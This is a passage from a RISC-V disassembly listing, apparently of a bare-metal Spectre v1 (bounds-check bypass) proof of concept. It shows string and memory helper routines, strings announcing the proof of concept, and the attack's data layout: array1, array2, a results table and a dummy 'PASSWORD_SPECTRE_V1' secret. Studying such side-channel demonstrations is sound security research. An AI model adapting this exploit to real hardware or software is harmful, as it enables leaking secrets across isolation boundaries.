    800024f2:	fd043783          	ld	a5,-48(s0)
    800024f6:	00178693          	addi	a3,a5,1
    800024fa:	fcd43823          	sd	a3,-48(s0)
    800024fe:	00074703          	lbu	a4,0(a4)
    80002502:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    80002506:	fc843703          	ld	a4,-56(s0)
    8000250a:	fb843783          	ld	a5,-72(s0)
    8000250e:	97ba                	add	a5,a5,a4
    80002510:	fd043703          	ld	a4,-48(s0)
    80002514:	fcf769e3          	bltu	a4,a5,800024e6 <memcpy+0x7a>
  }
  return dest;
    80002518:	fc843783          	ld	a5,-56(s0)
}
    8000251c:	853e                	mv	a0,a5
    8000251e:	6426                	ld	s0,72(sp)
    80002520:	6161                	addi	sp,sp,80
    80002522:	8082                	ret

0000000080002524 <memset>:

void* memset(void* dest, int byte, size_t len)
{
    80002524:	715d                	addi	sp,sp,-80
    80002526:	e4a2                	sd	s0,72(sp)
    80002528:	0880                	addi	s0,sp,80
    8000252a:	fca43423          	sd	a0,-56(s0)
    8000252e:	87ae                	mv	a5,a1
    80002530:	fac43c23          	sd	a2,-72(s0)
    80002534:	fcf42223          	sw	a5,-60(s0)
  if ((((uintptr_t)dest | len) & (sizeof(uintptr_t)-1)) == 0) {
    80002538:	fc843703          	ld	a4,-56(s0)
    8000253c:	fb843783          	ld	a5,-72(s0)
    80002540:	8fd9                	or	a5,a5,a4
    80002542:	8b9d                	andi	a5,a5,7
    80002544:	e7bd                	bnez	a5,800025b2 <memset+0x8e>
    uintptr_t word = byte & 0xFF;
    80002546:	fc442783          	lw	a5,-60(s0)
    8000254a:	0ff7f793          	andi	a5,a5,255
    8000254e:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 8;
    80002552:	fd843783          	ld	a5,-40(s0)
    80002556:	07a2                	slli	a5,a5,0x8
    80002558:	fd843703          	ld	a4,-40(s0)
    8000255c:	8fd9                	or	a5,a5,a4
    8000255e:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16;
    80002562:	fd843783          	ld	a5,-40(s0)
    80002566:	07c2                	slli	a5,a5,0x10
    80002568:	fd843703          	ld	a4,-40(s0)
    8000256c:	8fd9                	or	a5,a5,a4
    8000256e:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16 << 16;
    80002572:	fd843783          	ld	a5,-40(s0)
    80002576:	1782                	slli	a5,a5,0x20
    80002578:	fd843703          	ld	a4,-40(s0)
    8000257c:	8fd9                	or	a5,a5,a4
    8000257e:	fcf43c23          	sd	a5,-40(s0)

    uintptr_t *d = dest;
    80002582:	fc843783          	ld	a5,-56(s0)
    80002586:	fef43423          	sd	a5,-24(s0)
    while (d < (uintptr_t*)(dest + len))
    8000258a:	a811                	j	8000259e <memset+0x7a>
      *d++ = word;
    8000258c:	fe843783          	ld	a5,-24(s0)
    80002590:	00878713          	addi	a4,a5,8
    80002594:	fee43423          	sd	a4,-24(s0)
    80002598:	fd843703          	ld	a4,-40(s0)
    8000259c:	e398                	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    8000259e:	fc843703          	ld	a4,-56(s0)
    800025a2:	fb843783          	ld	a5,-72(s0)
    800025a6:	97ba                	add	a5,a5,a4
    800025a8:	fe843703          	ld	a4,-24(s0)
    800025ac:	fef760e3          	bltu	a4,a5,8000258c <memset+0x68>
    800025b0:	a81d                	j	800025e6 <memset+0xc2>
  } else {
    char *d = dest;
    800025b2:	fc843783          	ld	a5,-56(s0)
    800025b6:	fef43023          	sd	a5,-32(s0)
    while (d < (char*)(dest + len))
    800025ba:	a829                	j	800025d4 <memset+0xb0>
      *d++ = byte;
    800025bc:	fe043783          	ld	a5,-32(s0)
    800025c0:	00178713          	addi	a4,a5,1
    800025c4:	fee43023          	sd	a4,-32(s0)
    800025c8:	fc442703          	lw	a4,-60(s0)
    800025cc:	0ff77713          	andi	a4,a4,255
    800025d0:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    800025d4:	fc843703          	ld	a4,-56(s0)
    800025d8:	fb843783          	ld	a5,-72(s0)
    800025dc:	97ba                	add	a5,a5,a4
    800025de:	fe043703          	ld	a4,-32(s0)
    800025e2:	fcf76de3          	bltu	a4,a5,800025bc <memset+0x98>
  }
  return dest;
    800025e6:	fc843783          	ld	a5,-56(s0)
}
    800025ea:	853e                	mv	a0,a5
    800025ec:	6426                	ld	s0,72(sp)
    800025ee:	6161                	addi	sp,sp,80
    800025f0:	8082                	ret

00000000800025f2 <strlen>:

size_t strlen(const char *s)
{
    800025f2:	7179                	addi	sp,sp,-48
    800025f4:	f422                	sd	s0,40(sp)
    800025f6:	1800                	addi	s0,sp,48
    800025f8:	fca43c23          	sd	a0,-40(s0)
  const char *p = s;
    800025fc:	fd843783          	ld	a5,-40(s0)
    80002600:	fef43423          	sd	a5,-24(s0)
  while (*p)
    80002604:	a031                	j	80002610 <strlen+0x1e>
    p++;
    80002606:	fe843783          	ld	a5,-24(s0)
    8000260a:	0785                	addi	a5,a5,1
    8000260c:	fef43423          	sd	a5,-24(s0)
  while (*p)
    80002610:	fe843783          	ld	a5,-24(s0)
    80002614:	0007c783          	lbu	a5,0(a5)
    80002618:	f7fd                	bnez	a5,80002606 <strlen+0x14>
  return p - s;
    8000261a:	fe843703          	ld	a4,-24(s0)
    8000261e:	fd843783          	ld	a5,-40(s0)
    80002622:	40f707b3          	sub	a5,a4,a5
}
    80002626:	853e                	mv	a0,a5
    80002628:	7422                	ld	s0,40(sp)
    8000262a:	6145                	addi	sp,sp,48
    8000262c:	8082                	ret

000000008000262e <strnlen>:

size_t strnlen(const char *s, size_t n)
{
    8000262e:	7179                	addi	sp,sp,-48
    80002630:	f422                	sd	s0,40(sp)
    80002632:	1800                	addi	s0,sp,48
    80002634:	fca43c23          	sd	a0,-40(s0)
    80002638:	fcb43823          	sd	a1,-48(s0)
  const char *p = s;
    8000263c:	fd843783          	ld	a5,-40(s0)
    80002640:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    80002644:	a031                	j	80002650 <strnlen+0x22>
    p++;
    80002646:	fe843783          	ld	a5,-24(s0)
    8000264a:	0785                	addi	a5,a5,1
    8000264c:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    80002650:	fd043783          	ld	a5,-48(s0)
    80002654:	fff78713          	addi	a4,a5,-1
    80002658:	fce43823          	sd	a4,-48(s0)
    8000265c:	c791                	beqz	a5,80002668 <strnlen+0x3a>
    8000265e:	fe843783          	ld	a5,-24(s0)
    80002662:	0007c783          	lbu	a5,0(a5)
    80002666:	f3e5                	bnez	a5,80002646 <strnlen+0x18>
  return p - s;
    80002668:	fe843703          	ld	a4,-24(s0)
    8000266c:	fd843783          	ld	a5,-40(s0)
    80002670:	40f707b3          	sub	a5,a4,a5
}
    80002674:	853e                	mv	a0,a5
    80002676:	7422                	ld	s0,40(sp)
    80002678:	6145                	addi	sp,sp,48
    8000267a:	8082                	ret

000000008000267c <strcmp>:

int strcmp(const char* s1, const char* s2)
{
    8000267c:	7179                	addi	sp,sp,-48
    8000267e:	f422                	sd	s0,40(sp)
    80002680:	1800                	addi	s0,sp,48
    80002682:	fca43c23          	sd	a0,-40(s0)
    80002686:	fcb43823          	sd	a1,-48(s0)
  unsigned char c1, c2;

  do {
    c1 = *s1++;
    8000268a:	fd843783          	ld	a5,-40(s0)
    8000268e:	00178713          	addi	a4,a5,1
    80002692:	fce43c23          	sd	a4,-40(s0)
    80002696:	0007c783          	lbu	a5,0(a5)
    8000269a:	fef407a3          	sb	a5,-17(s0)
    c2 = *s2++;
    8000269e:	fd043783          	ld	a5,-48(s0)
    800026a2:	00178713          	addi	a4,a5,1
    800026a6:	fce43823          	sd	a4,-48(s0)
    800026aa:	0007c783          	lbu	a5,0(a5)
    800026ae:	fef40723          	sb	a5,-18(s0)
  } while (c1 != 0 && c1 == c2);
    800026b2:	fef44783          	lbu	a5,-17(s0)
    800026b6:	0ff7f793          	andi	a5,a5,255
    800026ba:	cb99                	beqz	a5,800026d0 <strcmp+0x54>
    800026bc:	fef44703          	lbu	a4,-17(s0)
    800026c0:	fee44783          	lbu	a5,-18(s0)
    800026c4:	0ff77713          	andi	a4,a4,255
    800026c8:	0ff7f793          	andi	a5,a5,255
    800026cc:	faf70fe3          	beq	a4,a5,8000268a <strcmp+0xe>

  return c1 - c2;
    800026d0:	fef44783          	lbu	a5,-17(s0)
    800026d4:	0007871b          	sext.w	a4,a5
    800026d8:	fee44783          	lbu	a5,-18(s0)
    800026dc:	2781                	sext.w	a5,a5
    800026de:	40f707bb          	subw	a5,a4,a5
    800026e2:	2781                	sext.w	a5,a5
}
    800026e4:	853e                	mv	a0,a5
    800026e6:	7422                	ld	s0,40(sp)
    800026e8:	6145                	addi	sp,sp,48
    800026ea:	8082                	ret

00000000800026ec <strcpy>:

char* strcpy(char* dest, const char* src)
{
    800026ec:	7179                	addi	sp,sp,-48
    800026ee:	f422                	sd	s0,40(sp)
    800026f0:	1800                	addi	s0,sp,48
    800026f2:	fca43c23          	sd	a0,-40(s0)
    800026f6:	fcb43823          	sd	a1,-48(s0)
  char* d = dest;
    800026fa:	fd843783          	ld	a5,-40(s0)
    800026fe:	fef43423          	sd	a5,-24(s0)
  while ((*d++ = *src++))
    80002702:	0001                	nop
    80002704:	fd043703          	ld	a4,-48(s0)
    80002708:	00170793          	addi	a5,a4,1
    8000270c:	fcf43823          	sd	a5,-48(s0)
    80002710:	fe843783          	ld	a5,-24(s0)
    80002714:	00178693          	addi	a3,a5,1
    80002718:	fed43423          	sd	a3,-24(s0)
    8000271c:	00074703          	lbu	a4,0(a4)
    80002720:	00e78023          	sb	a4,0(a5)
    80002724:	0007c783          	lbu	a5,0(a5)
    80002728:	fff1                	bnez	a5,80002704 <strcpy+0x18>
    ;
  return dest;
    8000272a:	fd843783          	ld	a5,-40(s0)
}
    8000272e:	853e                	mv	a0,a5
    80002730:	7422                	ld	s0,40(sp)
    80002732:	6145                	addi	sp,sp,48
    80002734:	8082                	ret

0000000080002736 <atol>:

long atol(const char* str)
{
    80002736:	7179                	addi	sp,sp,-48
    80002738:	f422                	sd	s0,40(sp)
    8000273a:	1800                	addi	s0,sp,48
    8000273c:	fca43c23          	sd	a0,-40(s0)
  long res = 0;
    80002740:	fe043423          	sd	zero,-24(s0)
  int sign = 0;
    80002744:	fe042223          	sw	zero,-28(s0)

  while (*str == ' ')
    80002748:	a031                	j	80002754 <atol+0x1e>
    str++;
    8000274a:	fd843783          	ld	a5,-40(s0)
    8000274e:	0785                	addi	a5,a5,1
    80002750:	fcf43c23          	sd	a5,-40(s0)
  while (*str == ' ')
    80002754:	fd843783          	ld	a5,-40(s0)
    80002758:	0007c783          	lbu	a5,0(a5)
    8000275c:	873e                	mv	a4,a5
    8000275e:	02000793          	li	a5,32
    80002762:	fef704e3          	beq	a4,a5,8000274a <atol+0x14>

  if (*str == '-' || *str == '+') {
    80002766:	fd843783          	ld	a5,-40(s0)
    8000276a:	0007c783          	lbu	a5,0(a5)
    8000276e:	873e                	mv	a4,a5
    80002770:	02d00793          	li	a5,45
    80002774:	00f70b63          	beq	a4,a5,8000278a <atol+0x54>
    80002778:	fd843783          	ld	a5,-40(s0)
    8000277c:	0007c783          	lbu	a5,0(a5)
    80002780:	873e                	mv	a4,a5
    80002782:	02b00793          	li	a5,43
    80002786:	06f71263          	bne	a4,a5,800027ea <atol+0xb4>
    sign = *str == '-';
    8000278a:	fd843783          	ld	a5,-40(s0)
    8000278e:	0007c783          	lbu	a5,0(a5)
    80002792:	0007871b          	sext.w	a4,a5
    80002796:	02d00793          	li	a5,45
    8000279a:	40f707b3          	sub	a5,a4,a5
    8000279e:	0017b793          	seqz	a5,a5
    800027a2:	0ff7f793          	andi	a5,a5,255
    800027a6:	fef42223          	sw	a5,-28(s0)
    str++;
    800027aa:	fd843783          	ld	a5,-40(s0)
    800027ae:	0785                	addi	a5,a5,1
    800027b0:	fcf43c23          	sd	a5,-40(s0)
  }

  while (*str) {
    800027b4:	a81d                	j	800027ea <atol+0xb4>
    res *= 10;
    800027b6:	fe843703          	ld	a4,-24(s0)
    800027ba:	87ba                	mv	a5,a4
    800027bc:	078a                	slli	a5,a5,0x2
    800027be:	97ba                	add	a5,a5,a4
    800027c0:	0786                	slli	a5,a5,0x1
    800027c2:	fef43423          	sd	a5,-24(s0)
    res += *str++ - '0';
    800027c6:	fd843783          	ld	a5,-40(s0)
    800027ca:	00178713          	addi	a4,a5,1
    800027ce:	fce43c23          	sd	a4,-40(s0)
    800027d2:	0007c783          	lbu	a5,0(a5)
    800027d6:	2781                	sext.w	a5,a5
    800027d8:	fd07879b          	addiw	a5,a5,-48
    800027dc:	2781                	sext.w	a5,a5
    800027de:	873e                	mv	a4,a5
    800027e0:	fe843783          	ld	a5,-24(s0)
    800027e4:	97ba                	add	a5,a5,a4
    800027e6:	fef43423          	sd	a5,-24(s0)
  while (*str) {
    800027ea:	fd843783          	ld	a5,-40(s0)
    800027ee:	0007c783          	lbu	a5,0(a5)
    800027f2:	f3f1                	bnez	a5,800027b6 <atol+0x80>
  }

  return sign ? -res : res;
    800027f4:	fe442783          	lw	a5,-28(s0)
    800027f8:	2781                	sext.w	a5,a5
    800027fa:	c791                	beqz	a5,80002806 <atol+0xd0>
    800027fc:	fe843783          	ld	a5,-24(s0)
    80002800:	40f007b3          	neg	a5,a5
    80002804:	a019                	j	8000280a <atol+0xd4>
    80002806:	fe843783          	ld	a5,-24(s0)
}
    8000280a:	853e                	mv	a0,a5
    8000280c:	7422                	ld	s0,40(sp)
    8000280e:	6145                	addi	sp,sp,48
    80002810:	8082                	ret

Disassembly of section .rodata:

0000000080002818 <.rodata>:
    80002818:	4150                	lw	a2,4(a0)
    8000281a:	4f575353          	0x4f575353
    8000281e:	4452                	lw	s0,20(sp)
    80002820:	535f 4550 5443      	0x54434550535f
    80002826:	4552                	lw	a0,20(sp)
    80002828:	565f 0031 0000      	0x31565f
    8000282e:	0000                	unimp
    80002830:	3d3d                	addiw	s10,s10,-17
    80002832:	3d3d                	addiw	s10,s10,-17
    80002834:	3d3d                	addiw	s10,s10,-17
    80002836:	3d3d                	addiw	s10,s10,-17
    80002838:	3d3d                	addiw	s10,s10,-17
    8000283a:	3d3d                	addiw	s10,s10,-17
    8000283c:	3d3d                	addiw	s10,s10,-17
    8000283e:	3d3d                	addiw	s10,s10,-17
    80002840:	203d                	0x203d
    80002842:	6854                	ld	a3,144(s0)
    80002844:	7369                	lui	t1,0xffffa
    80002846:	6920                	ld	s0,80(a0)
    80002848:	20612073          	csrs	0x206,sp
    8000284c:	4f50                	lw	a2,28(a4)
    8000284e:	666f2043          	fmadd.q	ft0,ft10,ft6,fa2,rdn
    80002852:	7320                	ld	s0,96(a4)
    80002854:	6570                	ld	a2,200(a0)
    80002856:	65727463          	bgeu	tp,s7,80002e9e <dummyMem+0x29e>
    8000285a:	765f 2031 4228      	0x42282031765f
    80002860:	6172                	ld	sp,280(sp)
    80002862:	636e                	ld	t1,216(sp)
    80002864:	2068                	fld	fa0,192(s0)
    80002866:	646e6f43          	0x646e6f43
    8000286a:	7469                	lui	s0,0xffffa
    8000286c:	6f69                	lui	t5,0x1a
    8000286e:	206e                	fld	ft0,216(sp)
    80002870:	63656843          	fmadd.d	fa6,fa0,fs6,fa2,unknown
    80002874:	7942206b          	0x7942206b
    80002878:	6170                	ld	a2,192(a0)
    8000287a:	20297373          	csrrci	t1,hedeleg,18
    8000287e:	3d3d                	addiw	s10,s10,-17
    80002880:	3d3d                	addiw	s10,s10,-17
    80002882:	3d3d                	addiw	s10,s10,-17
    80002884:	3d3d                	addiw	s10,s10,-17
    80002886:	3d3d                	addiw	s10,s10,-17
    80002888:	3d3d                	addiw	s10,s10,-17
    8000288a:	3d3d                	addiw	s10,s10,-17
    8000288c:	3d3d                	addiw	s10,s10,-17
    8000288e:	3d3d                	addiw	s10,s10,-17
    80002890:	3d3d                	addiw	s10,s10,-17
    80002892:	3d3d                	addiw	s10,s10,-17
    80002894:	3d3d                	addiw	s10,s10,-17
    80002896:	203d                	0x203d
    80002898:	000a                	c.slli	zero,0x2
    8000289a:	0000                	unimp
    8000289c:	0000                	unimp
    8000289e:	0000                	unimp
    800028a0:	6874                	ld	a3,208(s0)
    800028a2:	2065                	0x2065
    800028a4:	72636573          	csrrsi	a0,0x726,6
    800028a8:	7465                	lui	s0,0xffff9
    800028aa:	6b20                	ld	s0,80(a4)
    800028ac:	7965                	lui	s2,0xffff9
    800028ae:	6920                	ld	s0,80(a0)
    800028b0:	73253a73          	csrrc	s4,0x732,a0
    800028b4:	0a20                	addi	s0,sp,280
    800028b6:	0000                	unimp
    800028b8:	3b305b1b          	0x3b305b1b
    800028bc:	333b3233          	0x333b3233
    800028c0:	6d32                	ld	s10,264(sp)
    800028c2:	6176                	ld	sp,344(sp)
    800028c4:	6464                	ld	s1,200(s0)
    800028c6:	5b72                	lw	s6,60(sp)
    800028c8:	3025                	0x3025
    800028ca:	3031                	0x3031
    800028cc:	5d70                	lw	a2,124(a0)
    800028ce:	203a                	fld	ft0,392(sp)
    800028d0:	746e6177          	0x746e6177
    800028d4:	2528                	fld	fa0,72(a0)
    800028d6:	3a202963          	0x3a202963
    800028da:	2820                	fld	fs0,80(s0)
    800028dc:	6968                	ld	a0,208(a0)
    800028de:	2d74                	fld	fa3,216(a0)
    800028e0:	6974                	ld	a3,208(a0)
    800028e2:	656d                	lui	a0,0x1b
    800028e4:	53412c73          	csrrs	s8,0x534,sp
    800028e8:	4349                	li	t1,18
    800028ea:	68632c43          	fmadd.s	fs8,ft6,ft6,fa3,rdn
    800028ee:	7261                	lui	tp,0xffff8
    800028f0:	2029                	0x2029
    800028f2:	203d                	0x203d
    800028f4:	2e31                	addiw	t3,t3,12
    800028f6:	2528                	fld	fa0,72(a0)
    800028f8:	756c                	ld	a1,232(a0)
    800028fa:	202c                	fld	fa1,64(s0)
    800028fc:	6425                	lui	s0,0x9
    800028fe:	202c                	fld	fa1,64(s0)
    80002900:	6325                	lui	t1,0x9
    80002902:	2029                	0x2029
    80002904:	2e32                	fld	ft8,264(sp)
    80002906:	2528                	fld	fa0,72(a0)
    80002908:	756c                	ld	a1,232(a0)
    8000290a:	202c                	fld	fa1,64(s0)
    8000290c:	6425                	lui	s0,0x9
    8000290e:	202c                	fld	fa1,64(s0)
    80002910:	6325                	lui	t1,0x9
    80002912:	1b29                	addi	s6,s6,-22
    80002914:	000a6d5b          	0xa6d5b
    80002918:	3b305b1b          	0x3b305b1b
    8000291c:	333b3233          	0x333b3233
    80002920:	6d31                	lui	s10,0xc
    80002922:	6176                	ld	sp,344(sp)
    80002924:	6464                	ld	s1,200(s0)
    80002926:	5b72                	lw	s6,60(sp)
    80002928:	3025                	0x3025
    8000292a:	3031                	0x3031
    8000292c:	5d70                	lw	a2,124(a0)
    8000292e:	203a                	fld	ft0,392(sp)
    80002930:	746e6177          	0x746e6177
    80002934:	2528                	fld	fa0,72(a0)
    80002936:	3a202963          	0x3a202963
    8000293a:	2820                	fld	fs0,80(s0)
    8000293c:	6968                	ld	a0,208(a0)
    8000293e:	2d74                	fld	fa3,216(a0)
    80002940:	6974                	ld	a3,208(a0)
    80002942:	656d                	lui	a0,0x1b
    80002944:	53412c73          	csrrs	s8,0x534,sp
    80002948:	4349                	li	t1,18
    8000294a:	68632c43          	fmadd.s	fs8,ft6,ft6,fa3,rdn
    8000294e:	7261                	lui	tp,0xffff8
    80002950:	2029                	0x2029
    80002952:	203d                	0x203d
    80002954:	2e31                	addiw	t3,t3,12
    80002956:	2528                	fld	fa0,72(a0)
    80002958:	756c                	ld	a1,232(a0)
    8000295a:	202c                	fld	fa1,64(s0)
    8000295c:	6425                	lui	s0,0x9
    8000295e:	202c                	fld	fa1,64(s0)
    80002960:	6325                	lui	t1,0x9
    80002962:	2029                	0x2029
    80002964:	2e32                	fld	ft8,264(sp)
    80002966:	2528                	fld	fa0,72(a0)
    80002968:	756c                	ld	a1,232(a0)
    8000296a:	202c                	fld	fa1,64(s0)
    8000296c:	6425                	lui	s0,0x9
    8000296e:	202c                	fld	fa1,64(s0)
    80002970:	6325                	lui	t1,0x9
    80002972:	1b29                	addi	s6,s6,-22
    80002974:	000a6d5b          	0xa6d5b
    80002978:	636d                	lui	t1,0x1b
    8000297a:	6379                	lui	t1,0x1e
    8000297c:	656c                	ld	a1,200(a0)
    8000297e:	0000                	unimp
    80002980:	696d                	lui	s2,0x1b
    80002982:	736e                	ld	t1,248(sp)
    80002984:	7274                	ld	a3,224(a2)
    80002986:	7465                	lui	s0,0xffff9
	...
    80002990:	6d49                	lui	s10,0x12
    80002992:	6c70                	ld	a2,216(s0)
    80002994:	6d65                	lui	s10,0x19
    80002996:	6e65                	lui	t3,0x19
    80002998:	2074                	fld	fa3,192(s0)
    8000299a:	616d                	addi	sp,sp,240
    8000299c:	6e69                	lui	t3,0x1a
    8000299e:	2928                	fld	fa0,80(a0)
    800029a0:	202c                	fld	fa1,64(s0)
    800029a2:	6f66                	ld	t5,88(sp)
    800029a4:	000a216f          	jal	sp,800a49a4 <_end+0x894e4>
    800029a8:	7325                	lui	t1,0xfffe9
    800029aa:	3d20                	fld	fs0,120(a0)
    800029ac:	2520                	fld	fs0,72(a0)
    800029ae:	646c                	ld	a1,200(s0)
    800029b0:	000a                	c.slli	zero,0x2
    800029b2:	0000                	unimp
    800029b4:	0000                	unimp
    800029b6:	0000                	unimp
    800029b8:	6e28                	ld	a0,88(a2)
    800029ba:	6c75                	lui	s8,0x1d
    800029bc:	296c                	fld	fa1,208(a0)
    800029be:	0000                	unimp
    800029c0:	f73c                	sd	a5,104(a4)
    800029c2:	ffff                	0xffff
    800029c4:	f926                	sd	s1,176(sp)
    800029c6:	ffff                	0xffff
    800029c8:	f918                	sd	a4,48(a0)
    800029ca:	ffff                	0xffff
    800029cc:	f926                	sd	s1,176(sp)
    800029ce:	ffff                	0xffff
    800029d0:	f926                	sd	s1,176(sp)
    800029d2:	ffff                	0xffff
    800029d4:	f926                	sd	s1,176(sp)
    800029d6:	ffff                	0xffff
    800029d8:	f926                	sd	s1,176(sp)
    800029da:	ffff                	0xffff
    800029dc:	f718                	sd	a4,40(a4)
    800029de:	ffff                	0xffff
    800029e0:	f926                	sd	s1,176(sp)
    800029e2:	ffff                	0xffff
    800029e4:	f926                	sd	s1,176(sp)
    800029e6:	ffff                	0xffff
    800029e8:	f6b6                	sd	a3,360(sp)
    800029ea:	ffff                	0xffff
    800029ec:	f72c                	sd	a1,104(a4)
    800029ee:	ffff                	0xffff
    800029f0:	f926                	sd	s1,176(sp)
    800029f2:	ffff                	0xffff
    800029f4:	f6c0                	sd	s0,168(a3)
    800029f6:	ffff                	0xffff
    800029f8:	f6ca                	sd	s2,360(sp)
    800029fa:	ffff                	0xffff
    800029fc:	f6ca                	sd	s2,360(sp)
    800029fe:	ffff                	0xffff
    80002a00:	f6ca                	sd	s2,360(sp)
    80002a02:	ffff                	0xffff
    80002a04:	f6ca                	sd	s2,360(sp)
    80002a06:	ffff                	0xffff
    80002a08:	f6ca                	sd	s2,360(sp)
    80002a0a:	ffff                	0xffff
    80002a0c:	f6ca                	sd	s2,360(sp)
    80002a0e:	ffff                	0xffff
    80002a10:	f6ca                	sd	s2,360(sp)
    80002a12:	ffff                	0xffff
    80002a14:	f6ca                	sd	s2,360(sp)
    80002a16:	ffff                	0xffff
    80002a18:	f6ca                	sd	s2,360(sp)
    80002a1a:	ffff                	0xffff
    80002a1c:	f926                	sd	s1,176(sp)
    80002a1e:	ffff                	0xffff
    80002a20:	f926                	sd	s1,176(sp)
    80002a22:	ffff                	0xffff
    80002a24:	f926                	sd	s1,176(sp)
    80002a26:	ffff                	0xffff
    80002a28:	f926                	sd	s1,176(sp)
    80002a2a:	ffff                	0xffff
    80002a2c:	f926                	sd	s1,176(sp)
    80002a2e:	ffff                	0xffff
    80002a30:	f926                	sd	s1,176(sp)
    80002a32:	ffff                	0xffff
    80002a34:	f926                	sd	s1,176(sp)
    80002a36:	ffff                	0xffff
    80002a38:	f926                	sd	s1,176(sp)
    80002a3a:	ffff                	0xffff
    80002a3c:	f926                	sd	s1,176(sp)
    80002a3e:	ffff                	0xffff
    80002a40:	f926                	sd	s1,176(sp)
    80002a42:	ffff                	0xffff
    80002a44:	f926                	sd	s1,176(sp)
    80002a46:	ffff                	0xffff
    80002a48:	f926                	sd	s1,176(sp)
    80002a4a:	ffff                	0xffff
    80002a4c:	f926                	sd	s1,176(sp)
    80002a4e:	ffff                	0xffff
    80002a50:	f926                	sd	s1,176(sp)
    80002a52:	ffff                	0xffff
    80002a54:	f926                	sd	s1,176(sp)
    80002a56:	ffff                	0xffff
    80002a58:	f926                	sd	s1,176(sp)
    80002a5a:	ffff                	0xffff
    80002a5c:	f926                	sd	s1,176(sp)
    80002a5e:	ffff                	0xffff
    80002a60:	f926                	sd	s1,176(sp)
    80002a62:	ffff                	0xffff
    80002a64:	f926                	sd	s1,176(sp)
    80002a66:	ffff                	0xffff
    80002a68:	f926                	sd	s1,176(sp)
    80002a6a:	ffff                	0xffff
    80002a6c:	f926                	sd	s1,176(sp)
    80002a6e:	ffff                	0xffff
    80002a70:	f926                	sd	s1,176(sp)
    80002a72:	ffff                	0xffff
    80002a74:	f926                	sd	s1,176(sp)
    80002a76:	ffff                	0xffff
    80002a78:	f926                	sd	s1,176(sp)
    80002a7a:	ffff                	0xffff
    80002a7c:	f926                	sd	s1,176(sp)
    80002a7e:	ffff                	0xffff
    80002a80:	f926                	sd	s1,176(sp)
    80002a82:	ffff                	0xffff
    80002a84:	f926                	sd	s1,176(sp)
    80002a86:	ffff                	0xffff
    80002a88:	f926                	sd	s1,176(sp)
    80002a8a:	ffff                	0xffff
    80002a8c:	f926                	sd	s1,176(sp)
    80002a8e:	ffff                	0xffff
    80002a90:	f926                	sd	s1,176(sp)
    80002a92:	ffff                	0xffff
    80002a94:	f926                	sd	s1,176(sp)
    80002a96:	ffff                	0xffff
    80002a98:	f926                	sd	s1,176(sp)
    80002a9a:	ffff                	0xffff
    80002a9c:	f926                	sd	s1,176(sp)
    80002a9e:	ffff                	0xffff
    80002aa0:	f926                	sd	s1,176(sp)
    80002aa2:	ffff                	0xffff
    80002aa4:	f926                	sd	s1,176(sp)
    80002aa6:	ffff                	0xffff
    80002aa8:	f926                	sd	s1,176(sp)
    80002aaa:	ffff                	0xffff
    80002aac:	f926                	sd	s1,176(sp)
    80002aae:	ffff                	0xffff
    80002ab0:	f926                	sd	s1,176(sp)
    80002ab2:	ffff                	0xffff
    80002ab4:	f926                	sd	s1,176(sp)
    80002ab6:	ffff                	0xffff
    80002ab8:	f926                	sd	s1,176(sp)
    80002aba:	ffff                	0xffff
    80002abc:	f926                	sd	s1,176(sp)
    80002abe:	ffff                	0xffff
    80002ac0:	f76c                	sd	a1,232(a4)
    80002ac2:	ffff                	0xffff
    80002ac4:	f86c                	sd	a1,240(s0)
    80002ac6:	ffff                	0xffff
    80002ac8:	f926                	sd	s1,176(sp)
    80002aca:	ffff                	0xffff
    80002acc:	f926                	sd	s1,176(sp)
    80002ace:	ffff                	0xffff
    80002ad0:	f926                	sd	s1,176(sp)
    80002ad2:	ffff                	0xffff
    80002ad4:	f926                	sd	s1,176(sp)
    80002ad6:	ffff                	0xffff
    80002ad8:	f926                	sd	s1,176(sp)
    80002ada:	ffff                	0xffff
    80002adc:	f926                	sd	s1,176(sp)
    80002ade:	ffff                	0xffff
    80002ae0:	f926                	sd	s1,176(sp)
    80002ae2:	ffff                	0xffff
    80002ae4:	f760                	sd	s0,232(a4)
    80002ae6:	ffff                	0xffff
    80002ae8:	f926                	sd	s1,176(sp)
    80002aea:	ffff                	0xffff
    80002aec:	f926                	sd	s1,176(sp)
    80002aee:	ffff                	0xffff
    80002af0:	f8b4                	sd	a3,112(s1)
    80002af2:	ffff                	0xffff
    80002af4:	f8bc                	sd	a5,112(s1)
    80002af6:	ffff                	0xffff
    80002af8:	f926                	sd	s1,176(sp)
    80002afa:	ffff                	0xffff
    80002afc:	f926                	sd	s1,176(sp)
    80002afe:	ffff                	0xffff
    80002b00:	f788                	sd	a0,40(a5)
    80002b02:	ffff                	0xffff
    80002b04:	f926                	sd	s1,176(sp)
    80002b06:	ffff                	0xffff
    80002b08:	f8ac                	sd	a1,112(s1)
    80002b0a:	ffff                	0xffff
    80002b0c:	f926                	sd	s1,176(sp)
    80002b0e:	ffff                	0xffff
    80002b10:	f926                	sd	s1,176(sp)
    80002b12:	ffff                	0xffff
    80002b14:	f8de                	sd	s7,112(sp)
    80002b16:	ffff                	0xffff

Disassembly of section .data:

0000000080002b40 <array1>:
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
    80002b40:	0201                	addi	tp,tp,0
    80002b42:	06050403          	lb	s0,96(a0) # 1b060 <_tbss_end+0x1afdc>
    80002b46:	0a090807          	0xa090807
    80002b4a:	0e0d0c0b          	0xe0d0c0b
    80002b4e:	0000100f          	fence.i
	...

Disassembly of section .sdata:

0000000080002be0 <array1_sz>:
uint64_t array1_sz = 16;
    80002be0:	0010                	0x10
    80002be2:	0000                	unimp
    80002be4:	0000                	unimp
	...

0000000080002be8 <secretString>:
char* secretString = "PASSWORD_SPECTRE_V1";
    80002be8:	2818                	fld	fa4,16(s0)
    80002bea:	8000                	0x8000
    80002bec:	0000                	unimp
	...

Disassembly of section .bss:

0000000080002c00 <dummyMem>:
	...

0000000080016c00 <unused1>:
	...

0000000080016c40 <unused2>:
	...

0000000080016c80 <array2>:
	...

000000008001ac80 <results.3011>:
	...

000000008001b480 <counters>:
	...

000000008001b490 <counter_names>:
	...

000000008001b4a0 <count.2896>:
    8001b4a0:	0000                	unimp
	...

